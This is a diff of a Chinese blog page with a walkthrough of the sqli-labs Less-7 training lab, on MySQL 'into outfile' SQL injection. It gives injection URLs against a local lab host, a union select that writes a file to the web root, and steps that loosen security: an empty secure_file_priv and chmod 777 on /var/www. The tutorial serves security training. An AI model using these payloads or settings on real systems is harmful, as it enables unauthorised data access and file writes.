@@ -5,9 +5,8 @@
 <head><meta name="generator" content="Hexo 3.9.0">
     <meta charset="utf-8">
     <meta name="keywords" content="sqli-labs-Less7, Junk Blog">
-    <meta name="description" content="前言这一关主要是导入导出数据库中的数据。
-相关知识outfile：导出检索出的数据loadfile：将表的内容导出为一个文本文件（一次导出一行）dumpfile：将数据导入 MYSQL
-【sqli-labs】 less7 GET - Dum">
+    <meta name="description" content="前言这次的标题是 dump into file 经过一些简单的测试，发现报错注入行不同，一些正常的注入也没有回显。所以结合标题 说明这题需要新的思路和手段。
+基础知识outfile：导出检索出的数据loadfile：将表的内容导出为一个文本">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -284,7 +283,7 @@
 
 
 
-<div class="bg-cover post-cover" style="background-image: url('/medias/featureimages/9.jpg')">
+<div class="bg-cover post-cover" style="background-image: url('https://i.loli.net/2019/10/10/3eZ9bGryn1WOsD8.png')">
     <div class="container">
         <div class="row">
             <div class="col s12 m12 l12">
@@ -417,7 +416,7 @@
                     
                     <div class="info-break-policy">
                         <i class="fa fa-file-word-o fa-fw"></i>文章字数:&nbsp;&nbsp;
-                        431
+                        598
                     </div>
                     
 
@@ -440,46 +439,49 @@
         <hr class="clearfix">
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>这一关主要是导入导出数据库中的数据。</p>
-<p>相关知识<br>outfile：导出检索出的数据<br>loadfile：将表的内容导出为一个文本文件（一次导出一行）<br>dumpfile：将数据导入 MYSQL</p>
-<h1 id="【sqli-labs】-less7-GET-Dump-into-outfile-String-导出文件GET字符型注入"><a href="#【sqli-labs】-less7-GET-Dump-into-outfile-String-导出文件GET字符型注入" class="headerlink" title="【sqli-labs】 less7 GET - Dump into outfile - String (导出文件GET字符型注入)"></a>【sqli-labs】 less7 GET - Dump into outfile - String (导出文件GET字符型注入)</h1><ol>
+                <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>这次的标题是 dump into file 经过一些简单的测试，发现报错注入行不同，一些正常的注入也没有回显。所以结合标题 说明这题需要新的思路和手段。</p>
+<h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><p>outfile：导出检索出的数据<br>loadfile：将表的内容导出为一个文本文件（一次导出一行）<br>dumpfile：将数据导入 MYSQL</p>
+<h2 id="工作原理"><a href="#工作原理" class="headerlink" title="工作原理"></a>工作原理</h2><p>这个原理其实比较简单。就是利用语句 <code>into outfile ” 路径（服务器）”</code> 可以把内容输出到，服务器上该路径的文本中。</p>
+<h1 id="注入步骤"><a href="#注入步骤" class="headerlink" title="注入步骤"></a>注入步骤</h1><h2 id="Dump-into-outfile-String-导出文件GET字符型注入"><a href="#Dump-into-outfile-String-导出文件GET字符型注入" class="headerlink" title="Dump into outfile - String (导出文件GET字符型注入)"></a>Dump into outfile - String (导出文件GET字符型注入)</h2><ol>
 <li><strong>输入字符使网页报错,判断执行的 SQL 语句</strong></li>
 </ol>
-<pre><code>http://192.168.150.128/sqli-labs-master/Less-7/?id=1&#39;</code></pre><p><img src="https://i.loli.net/2019/10/07/ESFlPXGr9OCgUK3.png" alt="less7-1.png"></p>
+<pre><code>http://192.168.150.128/sqli-labs-master/Less-7/?id=1'</code></pre><p><img src="https://i.loli.net/2019/10/07/ESFlPXGr9OCgUK3.png" alt="less7-1.png"></p>
 <p>注：”You have an error in your SQL syntax“ 这里数据库的报错信息被屏蔽了，所以只能手动猜测 sql 语句。</p>
 <ol start="2">
 <li><strong>使用“单引号+括号”判断执行的 SQL 语句</strong></li>
 </ol>
-<pre><code>192.168.150.128/sqli-labs-master/Less-7/?id=1&#39;)%23</code></pre><p><img src="https://i.loli.net/2019/10/07/ISi9sjTpxAPZB5H.png" alt="less7-2.png"></p>
+<pre><code>192.168.150.128/sqli-labs-master/Less-7/?id=1')%23</code></pre><p><img src="https://i.loli.net/2019/10/07/ISi9sjTpxAPZB5H.png" alt="less7-2.png"></p>
 <ol start="3">
 <li><strong>使用“单引号+括号+括号”判断执行的 SQL 语句</strong></li>
 </ol>
-<pre><code>192.168.150.128/sqli-labs-master/Less-7/?id=1&#39;))%23</code></pre><p><img src="https://i.loli.net/2019/10/07/yRmgzXBYV4CZLrT.png" alt="less7-3.png"></p>
+<pre><code>192.168.150.128/sqli-labs-master/Less-7/?id=1'))%23</code></pre><p><img src="https://i.loli.net/2019/10/07/yRmgzXBYV4CZLrT.png" alt="less7-3.png"></p>
 <p>注：输出正常，sql 语句为：select * from table where id=((‘input’))</p>
 <ol start="4">
 <li><strong>判断字段数</strong></li>
 </ol>
-<pre><code>192.168.150.128/sqli-labs-master/Less-7/?id=1&#39;)) order by 4%23</code></pre><p><img src="https://i.loli.net/2019/10/07/HuKiOyUJlBtWZgc.png" alt="less7-4.png"></p>
+<pre><code>192.168.150.128/sqli-labs-master/Less-7/?id=1')) order by 4%23</code></pre><p><img src="https://i.loli.net/2019/10/07/HuKiOyUJlBtWZgc.png" alt="less7-4.png"></p>
 <ol start="5">
 <li><strong>测试当前用户权限</strong></li>
 </ol>
-<pre><code>http://192.168.150.128/sqli-labs-master/Less-7/?id=1&#39;)) and(select count(*) from mysql.user)&gt;0%23</code></pre><ol start="6">
-<li><strong>mysql 默认是禁止导入导出数据</strong><pre class=" language-bash"><code class="language-bash">/** 编辑 my.cnf 文件 **/
-<span class="token punctuation">[</span>root@localhost ~<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># vim /etc/my.cnf</span>
-</code></pre>
-</li>
+<pre><code>http://192.168.150.128/sqli-labs-master/Less-7/?id=1')) and(select count(*) from mysql.user)&gt;0%23</code></pre><ol start="6">
+<li><strong>在服务器端修改 mysql 配置文件（开启 mysql 数据导入导出功能）</strong></li>
 </ol>
-<p>/** 在文件中添加如下内容，如下图所示 **/<br>secure_file_priv=’’</p>
-<pre><code>![less7-5.png](https://i.loli.net/2019/10/07/xX2aeIRbUfPiql9.png)
+<pre class=" language-bash"><code class="language-bash">/** 编辑 my.cnf 文件 **/
+<span class="token punctuation">[</span>root@localhost ~<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># vim /etc/my.cnf</span>
 
-```bash
-/** 重启 mariadb **/
-[root@localhost ~]# systemctl restart mariadb</code></pre><pre class=" language-bash"><code class="language-bash">/** 设置 /var/www 权限 **/
+/** 在文件中添加如下内容，如下图所示 **/
+secure_file_priv<span class="token operator">=</span><span class="token string">''</span></code></pre>
+<p><img src="https://i.loli.net/2019/10/07/xX2aeIRbUfPiql9.png" alt="less7-5.png"></p>
+<pre class=" language-bash"><code class="language-bash">/** 重启 mariadb **/
+<span class="token punctuation">[</span>root@localhost ~<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># systemctl restart mariadb</span></code></pre>
+<pre class=" language-bash"><code class="language-bash">/** 设置 /var/www 权限 **/
 <span class="token punctuation">[</span>root@localhost ~<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># chmod -R 777 /var/www</span></code></pre>
+<p>注：mysql 默认禁用数据导入导出功能。</p>
 <ol start="6">
 <li><strong>导出数据到 “/var/www/html/test” 中</strong></li>
 </ol>
-<pre><code>http://192.168.150.128/sqli-labs-master/Less-7/?id=1&#39;)) union select 1,2,3 into outfile &quot;/var/www/html/test&quot;%23</code></pre><p><img src="https://i.loli.net/2019/10/07/wXOMAL7Ul6vixdn.png" alt="less7-7.png"></p>
+<pre><code>http://192.168.150.128/sqli-labs-master/Less-7/?id=1')) union select 1,2,3 into outfile "/var/www/html/test"%23</code></pre><p><img src="https://i.loli.net/2019/10/07/wXOMAL7Ul6vixdn.png" alt="less7-7.png"></p>
+<p>注：网页报错，但是从服务器上可以看到数据已经成功导出。</p>
 <ol start="7">
 <li><strong>查看导出的数据</strong></li>
 </ol>
@@ -487,7 +489,25 @@
 <h1 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h1><p><a href="https://www.php.cn/mysql-tutorials-401995.html" target="_blank" rel="noopener">mysql5.7导出数据提示–secure-file-priv选项问题的解决方法</a></p>
 <p><a href="https://blog.csdn.net/baidu_37576427/article/details/76160309" target="_blank" rel="noopener">SQLI labs 第七课（神游太虚）</a></p>
 <p><a href="https://www.cnblogs.com/omnis/p/8315087.html" target="_blank" rel="noopener">【sqli-labs】 less7 GET - Dump into outfile - String (导出文件GET字符型注入)</a></p>
-
+<script>
+        document.querySelectorAll('.github-emoji')
+          .forEach(el => {
+            if (!el.dataset.src) { return; }
+            const img = document.createElement('img');
+            img.style = 'display:none !important;';
+            img.src = el.dataset.src;
+            img.addEventListener('error', () => {
+              img.remove();
+              el.style.color = 'inherit';
+              el.style.backgroundImage = 'none';
+              el.style.background = 'none';
+            });
+            img.addEventListener('load', () => {
+              img.remove();
+            });
+            document.body.appendChild(img);
+          });
+      </script>
             </div>
             <hr/>
 
@@ -508,7 +528,7 @@
                     <span class="reprint-tip">
                         <i class="fa fa-exclamation-circle"></i>&nbsp;&nbsp;转载请注明:
                     </span>
-                    <a href="http://yoursite.com" class="b-link-green">Junk Blog</a>
+                    <a href="https://github.com/hhkk2334/hhkk2334.github.io" class="b-link-green">Junk Blog</a>
                     <i class="fa fa-angle-right fa-lg fa-fw text-color"></i>
                     <a href="/2019/10/05/sqli-labs-Less7/" class="b-link-green">sqli-labs-Less7</a>
                 </p>
@@ -538,8 +558,7 @@
                 <a href="/2019/10/08/sqli-labs-Less8/">
                     <div class="card-image">
                         
-                        
-                        <img src="/medias/featureimages/10.jpg" class="responsive-img" alt="sqli-labs-Less8">
+                        <img src="https://i.loli.net/2019/10/10/fjNd243SYkOcGlD.png" class="responsive-img" alt="sqli-labs-Less8">
                         
                         <span class="card-title">sqli-labs-Less8</span>
                     </div>
@@ -591,8 +610,7 @@ SQL盲注的分类
                 <a href="/2019/10/05/sqli-labs-Less6/">
                     <div class="card-image">
                         
-                        
-                        <img src="/medias/featureimages/8.jpg" class="responsive-img" alt="sqli-labs-Less6">
+                        <img src="https://i.loli.net/2019/10/10/mtHlswdMoJn5KWI.png" class="responsive-img" alt="sqli-labs-Less6">
                         
                         <span class="card-title">sqli-labs-Less6</span>
                     </div>
@@ -601,11 +619,11 @@ SQL盲注的分类
                     <div class="summary">双注入GET双引号字符型注入(从报错信息中获取数据)
 输入字符使网页报错,判断执行的 SQL 语句
 
-http://192.168.150.128/sqli-labs-master/Less-6/?id=1&quot;
+http://192.168.150.128/sqli-labs-master/Less-6/?id=1"
 
 判断字段数
 
-ht</div>
+http://</div>
                     <div class="publish-info">
                             <span class="publish-date">
                                 <i class="fa fa-clock-o fa-fw icon-date"></i>2019-10-05
@@ -671,7 +689,7 @@ ht</div>
         var url = document.location.href;
         newdiv.innerHTML += '<br />'
             + '来源: Junk Blog<br />'
-            + '作者: Trash Can<br />'
+            + '作者: Trash Can,Trash Can<br />'
             + '链接: <a href="' + url + '">' + url + '</a><br />'
             + '本文章著作权归作者所有，任何形式的转载都请注明出处。';
 
@@ -734,16 +752,8 @@ ht</div>
 
 <footer class="page-footer bg-color">
     <div class="container row center-align">
-        <div class="col s12 m8 l8 copy-right">
-            本站由&copy;<a href="https://blinkfox.github.io/" target="_blank">Blinkfox</a>基于
-            <a href="https://hexo.io/" target="_blank">Hexo</a> 的
-            <a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">hexo-theme-matery</a>主题搭建.
-
-            
-                &nbsp;<i class="fa fa-area-chart"></i>&nbsp;站点总字数:&nbsp;
-                <span class="white-color">16.1k</span>
-            
-
+        <div class="col s12 m8 l8 copy-right" >
+    
             
 			
                 <br>
@@ -761,25 +771,6 @@ ht</div>
                 
             
         </div>
-        <div class="col s12 m4 l4 social-link social-statis">
-    <a href="https://github.com/hhkk2334/hhkk2334.github.io" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
-        <i class="fa fa-github"></i>
-    </a>
-
-
-
-    <a href="http://mail.qq.com/cgi-bin/qm_share?t=qm_mailme&email=RHZxdXFydXJ9dHEENTVqJysp" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
-        <i class="fa fa-envelope-open"></i>
-    </a>
-
-
-
-    <a href="tencent://AddContact/?fromId=50&fromSubId=1&subcmd=all&uin=2515616905" class="tooltipped" data-tooltip="QQ联系我: 2515616905" data-position="top" data-delay="50">
-        <i class="fa fa-qq"></i>
-    </a>
-
-
-</div>
     </div>
 </footer>
 
